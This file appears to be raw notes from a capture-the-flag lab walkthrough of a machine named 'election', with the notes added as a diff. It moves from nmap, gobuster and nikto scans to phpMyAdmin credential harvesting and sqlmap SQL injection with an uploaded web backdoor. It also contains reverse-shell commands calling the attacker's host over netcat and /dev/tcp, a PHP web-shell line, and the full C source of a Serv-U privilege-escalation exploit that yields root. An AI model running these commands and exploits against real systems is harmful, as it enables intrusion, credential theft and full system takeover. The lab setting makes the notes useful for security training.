@@ -1,0 +1,430 @@
+IP: 192.168.0.109
+
+Nmap scan results:
+
+nmap -A -T4 -p- 192.168.0.109
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 20:22 IST
+Nmap scan report for 192.168.0.109
+Host is up (0.0014s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
+|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
+|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/4%OT=22%CT=1%CU=34194%PV=Y%DS=2%DC=T%G=Y%TM=5FF32BCD
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11
+OS:NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=AC11%RUD=G)IE(R=Y%DFI=N%T=40%
+OS:CD=S)
+
+
+Gobuster scan results:
+
+gobuster dir -u http://192.168.0.109 -w /opt/SecLists/Discovery/Web-Content/big.txt -x php,html,txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.109
+[+] Threads:        10
+[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,html,txt
+[+] Timeout:        10s
+===============================================================
+2021/01/04 20:25:52 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.html (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htaccess.txt (Status: 403)
+/election (Status: 301)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/phpmyadmin (Status: 301)
+/phpinfo.php (Status: 200)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+
+
+Dirsearch scan results:
+
+python3 dirsearch.py -u http://192.168.0.109 -e -r -R 5
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: -r | HTTP method: GET | Threads: 30 | Wordlist size: 8918
+
+Error Log: /opt/dirsearch/logs/errors-21-01-04_20-27-09.log
+
+Target: http://192.168.0.109/
+
+Output File: /opt/dirsearch/reports/192.168.0.109/_21-01-04_20-27-09.txt
+
+[20:27:09] Starting:
+[20:27:11] 403 -  278B  - /.ht_wsr.txt                                                                                  
+[20:27:11] 403 -  278B  - /.htaccess.save
+[20:27:11] 403 -  278B  - /.htaccess.orig
+[20:27:11] 403 -  278B  - /.htaccess.sample
+[20:27:11] 403 -  278B  - /.htaccess.bak1
+[20:27:11] 403 -  278B  - /.htaccessBAK
+[20:27:11] 403 -  278B  - /.htaccessOLD2
+[20:27:11] 403 -  278B  - /.htaccess_extra
+[20:27:11] 403 -  278B  - /.htaccess_orig
+[20:27:11] 403 -  278B  - /.htaccess_sc
+[20:27:11] 403 -  278B  - /.htm
+[20:27:11] 403 -  278B  - /.html
+[20:27:11] 403 -  278B  - /.htpasswd_test
+[20:27:11] 403 -  278B  - /.httr-oauth
+[20:27:11] 403 -  278B  - /.htpasswds
+[20:27:11] 403 -  278B  - /.htaccessOLD
+[20:27:12] 403 -  278B  - /.php
+[20:27:32] 200 -   11KB - /index.html
+[20:27:32] 301 -  319B  - /javascript  ->  http://192.168.0.109/javascript/
+[20:27:37] 200 -   95KB - /phpinfo.php
+[20:27:37] 301 -  319B  - /phpmyadmin  ->  http://192.168.0.109/phpmyadmin/
+[20:27:38] 200 -   10KB - /phpmyadmin/
+[20:27:38] 200 -   10KB - /phpmyadmin/index.php
+[20:27:39] 200 -   30B  - /robots.txt
+[20:27:40] 403 -  278B  - /server-status
+[20:27:40] 403 -  278B  - /server-status/
+
+
+Nikto scan results:
+
+nikto -h 192.168.0.109
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.109
++ Target Hostname:    192.168.0.109
++ Target Port:        80
++ Start Time:         2021-01-04 20:26:51 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 59558e1434548, mtime: gzip
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
++ /phpinfo.php: Output from the phpinfo() function was found.
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 8067 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2021-01-04 20:28:03 (GMT5.5) (72 seconds)
+
+
+Robots.txt file content:
+
+admin
+wordpress
+user
+election
+
+This can be the users present on the website.
+
+
+phpmyadmin Enumeration:
+
+http://192.168.0.109/phpmyadmin/index.php?token=a63634ca641776c18d132756cea40710
+
+user:root
+pass:toor
+
+Found one username and password under tb_panitia (committee)
+
+User: Love
+Password: bb113886b0513a9d882e3caa5cd73314
+
+Got this weird file under /election/card.php
+The file contained binary form and after decoding it found this.
+
+gobuster dir -u http://192.168.0.109/election -w /opt/SecLists/Discovery/Web-Content/big.txt -x php,html,txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.109/election
+[+] Threads:        10
+[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,php,html
+[+] Timeout:        10s
+===============================================================
+2021/01/04 20:43:36 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htaccess.html (Status: 403)
+/.htaccess.txt (Status: 403)
+/admin (Status: 301)
+/card.php (Status: 200)
+/data (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/languages (Status: 301)
+/lib (Status: 301)
+/media (Status: 301)
+/themes (Status: 301)
+
+Credentials:
+
+user:1234
+pass:Zxc123!@#
+
+Logged in to the admin page.
+
+http://192.168.0.109/election/admin/dashboard.php?_loggedin
+
+
+sqlmap -r cookie.request --level=5 --risk=3 --os-shell --dbs
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4.12#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:12:44 /2021-01-04/
+
+[21:12:44] [INFO] parsing HTTP request from 'cookie.request'
+[21:12:44] [INFO] resuming back-end DBMS 'mysql'
+[21:12:44] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: aksi=fetch&id=76 AND 1661=1661
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: aksi=fetch&id=76 AND (SELECT 5226 FROM (SELECT(SLEEP(5)))GVlS)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: aksi=fetch&id=-3179 UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a6b71,0x5159586575596e7a6c7751424945646174687a76617378497a6b5756534e4668457a70784c636250,0x716b627071),NULL,NULL-- -
+---
+[21:12:44] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[21:12:44] [INFO] fetching database names
+[21:12:44] [INFO] resumed: 'election'
+[21:12:44] [INFO] resumed: 'information_schema'
+[21:12:44] [INFO] resumed: 'mysql'
+[21:12:44] [INFO] resumed: 'performance_schema'
+available databases [4]:
+[*] election
+[*] information_schema
+[*] mysql
+[*] performance_schema
+
+[21:12:44] [INFO] going to use a web backdoor for command prompt
+[21:12:44] [INFO] fingerprinting the back-end DBMS operating system
+[21:12:44] [INFO] the back-end DBMS operating system is Linux
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+do you want sqlmap to further try to provoke the full path disclosure? [Y/n] n
+[21:12:47] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> 4
+[21:12:48] [INFO] using generated directory list: /var/www,/var/www/html,/var/www/htdocs,/var/www/httpdocs,/var/www/php,/var/www/public,/var/www/src,/var/www/site,/var/www/build,/var/www/web,/var/www/data,/var/www/sites/all,/var/www/www/build,/usr/local/apache,/usr/local/apache/html,/usr/local/apache/htdocs,/usr/local/apache/httpdocs,/usr/local/apache/php,/usr/local/apache/public,/usr/local/apache/src,/usr/local/apache/site,/usr/local/apache/build,/usr/local/apache/web,/usr/local/apache/www,/usr/local/apache/data,/usr/local/apache/sites/all,/usr/local/apache/www/build,/usr/local/apache2,/usr/local/apache2/html,/usr/local/apache2/htdocs,/usr/local/apache2/httpdocs,/usr/local/apache2/php,/usr/local/apache2/public,/usr/local/apache2/src,/usr/local/apache2/site,/usr/local/apache2/build,/usr/local/apache2/web,/usr/local/apache2/www,/usr/local/apache2/data,/usr/local/apache2/sites/all,/usr/local/apache2/www/build,/usr/local/www/apache22,/usr/local/www/apache22/html,/usr/local/www/apache22/htdocs,/usr/local/www/apache22/httpdocs,/usr/local/www/apache22/php,/usr/local/www/apache22/public,/usr/local/www/apache22/src,/usr/local/www/apache22/site,/usr/local/www/apache22/build,/usr/local/www/apache22/web,/usr/local/www/apache22/www,/usr/local/www/apache22/data,/usr/local/www/apache22/sites/all,/usr/local/www/apache22/www/build,/usr/local/www/apache24,/usr/local/www/apache24/html,/usr/local/www/apache24/htdocs,/usr/local/www/apache24/httpdocs,/usr/local/www/apache24/php,/usr/local/www/apache24/public,/usr/local/www/apache24/src,/usr/local/www/apache24/site,/usr/local/www/apache24/build,/usr/local/www/apache24/web,/usr/local/www/apache24/www,/usr/local/www/apache24/data,/usr/local/www/apache24/sites/all,/usr/local/www/apache24/www/build,/usr/local/httpd,/usr/local/httpd/html,/usr/local/httpd/htdocs,/usr/local/httpd/httpdocs,/usr/local/httpd/php,/usr/local/httpd/public,/usr/local/httpd/src,/usr/local/httpd/site,/usr/local/httpd/build,/usr/local/httpd/web,/usr/local/httpd/www,/usr/local/httpd/data,/usr/local/httpd/sites/all,/usr/local/httpd/www/build,/var/www/nginx-default,/var/www/nginx-default/html,/var/www/nginx-default/htdocs,/var/www/nginx-default/httpdocs,/var/www/nginx-default/php,/var/www/nginx-default/public,/var/www/nginx-default/src,/var/www/nginx-default/site,/var/www/nginx-default/build,/var/www/nginx-default/web,/var/www/nginx-default/www,/var/www/nginx-default/data,/var/www/nginx-default/sites/all,/var/www/nginx-default/www/build,/srv/www,/srv/www/html,/srv/www/htdocs,/srv/www/httpdocs,/srv/www/php,/srv/www/public,/srv/www/src,/srv/www/site,/srv/www/build,/srv/www/web,/srv/www/data,/srv/www/sites/all,/srv/www/www/build
+use any additional custom directories [Enter for None]:
+[21:12:59] [WARNING] unable to automatically parse any web server path
+[21:12:59] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[21:12:59] [WARNING] unable to upload the file stager on '/var/www/'
+[21:12:59] [INFO] trying to upload the file stager on '/var/www/' via UNION method
+[21:12:59] [WARNING] expect junk characters inside the file as a leftover from UNION query
+[21:12:59] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+[21:12:59] [INFO] trying to upload the file stager on '/var/www/election/admin/ajax/' via LIMIT 'LINES TERMINATED BY' method
+[21:12:59] [WARNING] unable to upload the file stager on '/var/www/election/admin/ajax/'
+[21:12:59] [INFO] trying to upload the file stager on '/var/www/election/admin/ajax/' via UNION method
+[21:12:59] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+[21:12:59] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[21:12:59] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://192.168.0.109:80/tmputylj.php
+[21:13:00] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://192.168.0.109:80/tmpbxogw.php
+[21:13:00] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+os-shell> nc 192.168.0.111 1234 -e /bin/sh
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output:
+---
+nc: invalid option -- 'e'
+usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
+          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
+          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
+          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
+---
+os-shell> bash -i >& /dev/tcp/192.168.0.111/1234 0>&1
+do you want to retrieve the command standard output? [Y/n/a] y
+No output
+os-shell> pwd
+do you want to retrieve the command standard output? [Y/n/a]
+command standard output: '/var/www/html'
+os-shell> echo '<?php system($_GET["cmd"])?>' > shell.php
+do you want to retrieve the command standard output? [Y/n/a]
+No output
+os-shell>
+
+
+
+C:\Users\Voker\Downloads\netcat-win32-1.11\netcat-1.11>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.111] from (UNKNOWN) [192.168.0.109] 50980
+www-data@election:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@election:/var/www/html$
+
+www-data@election:/var/www/html/election/admin$ cd logs
+cd logs
+www-data@election:/var/www/html/election/admin/logs$ ls -la
+ls -la
+total 12
+drwxr-xr-x  2 www-data www-data 4096 May 27  2020 .
+drwxr-xr-x 10 www-data www-data 4096 Apr  3  2020 ..
+-rw-r--r--  1 www-data www-data  569 Jan  4 21:07 system.log
+www-data@election:/var/www/html/election/admin/logs$ cat system.log
+cat system.log
+[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
+[2020-04-03 00:13:53] Love added candidate 'Love'.
+[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
+[2021-01-04 20:50:35] Love has been logged in from Unknown IP on Firefox (Linux).
+[2021-01-04 20:54:10] Love changed a candidate photo (ID = 76).
+[2021-01-04 20:57:25] [ERROR.CDTPHOTO] Unsupported source file format!
+[2021-01-04 21:00:30] Love updated candidate data (ID = 76).
+[2021-01-04 21:07:27] Love has been logged in from Unknown IP on Chrome (Windows 10).
+
+
+Your Hardware Enablement Stack (HWE) is supported until April 2023.
+Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
+love@election:~$ ls -la
+total 100
+drwsrwxrwx 18 love love 4096 May 27  2020 .
+drwxr-xr-x  3 root root 4096 Apr  9  2020 ..
+-rw-------  1 love love   34 May 27  2020 .bash_history
+drwxrwxrwx 15 love love 4096 Apr  8  2020 .cache
+drwxrwxrwx 14 love love 4096 May 26  2020 .config
+drwxrwxrwx  3 love love 4096 Oct 20  2019 .dbus
+drwxrwxrwx  2 love love 4096 Apr  9  2020 Desktop
+drwxrwxrwx  2 love love 4096 Apr  8  2020 Documents
+drwxrwxrwx  2 love love 4096 Oct 20  2019 Downloads
+drwxrwxrwx  3 love love 4096 Oct 20  2019 .gnupg
+drwxrwxrwx  2 love love 4096 Oct 20  2019 .gvfs
+-rwxrwxrwx  1 love love 9882 May 27  2020 .ICEauthority
+drwxrwxrwx  3 love love 4096 Oct 20  2019 .local
+drwxrwxrwx  5 love love 4096 Apr  2  2020 .mozilla
+drwxrwxrwx  2 love love 4096 Oct 20  2019 Music
+drwxrwxrwx  2 love love 4096 Oct 21  2019 Pictures
+-rwxrwxrwx  1 love love  807 Oct 20  2019 .profile
+drwxrwxrwx  2 love love 4096 Oct 20  2019 Public
+-rwxrwxrwx  1 love love   66 Oct 20  2019 .selected_editor
+-rw-rw-r--  1 love love   83 May 26  2020 .Serv-U-Tray.conf
+drwxrwxrwx  2 love love 4096 Jan  4 21:20 .ssh
+-rwxrwxrwx  1 love love    0 Oct 20  2019 .sudo_as_admin_successful
+drwxrwxrwx  2 love love 4096 Oct 20  2019 Templates
+drwxrwxrwx  2 love love 4096 Oct 20  2019 Videos
+love@election:~$ cd Desktop
+love@election:~/Desktop$ ls -la
+total 12
+drwxrwxrwx  2 love love 4096 Apr  9  2020 .
+drwsrwxrwx 18 love love 4096 May 27  2020 ..
+-rw-rw----  1 love love   33 Apr  9  2020 user.txt
+love@election:~/Desktop$ cat user.txt
+cd38ac698c0d793a5236d01003f692b0
+
+/var/spool/cron/crontabs
+  Group plugdev:
+                                                                                                                        
+  Group lpadmin:
+/usr/share/ppd/custom                                                                                                   
+  Group sambashare:
+
+
+love@election:/tmp$ cat 47009
+/*
+
+CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation
+
+vulnerability found by:
+Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev
+
+to compile and run:
+gcc servu-pe-cve-2019-12181.c -o pe && ./pe
+
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main()
+{
+    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
+    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
+    // if execv is successful, we won't reach here
+    printf("ret val: %d errno: %d\n", ret_val, errno);
+    return errno;
+}love@election:/tmp$ mv 47009 exploit.c
+love@election:/tmp$ gcc exploit.c -o exploit
+love@election:/tmp$ ./exploit
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+opening root shell
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+# cd /root
+# ls -la
+total 44
+drwx------  6 root root 4096 Jan  4 20:20 .
+drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
+-rw-------  1 root root   66 May 27  2020 .bash_history
+drwx------  3 root root 4096 Apr  8  2020 .cache
+drwx------  5 root root 4096 May 27  2020 .config
+drwx------  3 root root 4096 Oct 20  2019 .gnupg
+drwxr-xr-x  3 root root 4096 Oct 20  2019 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Apr  9  2020 root.txt
+-rw-r--r--  1 root root   66 Apr  2  2020 .selected_editor
+-rw-r-----  1 root root    5 Jan  4 20:20 .vboxclient-display-svga.pid
+# cat root.txt
+5238feefc4ffe09645d97e9ee49bc3a6
+
+Happy Hacking :)
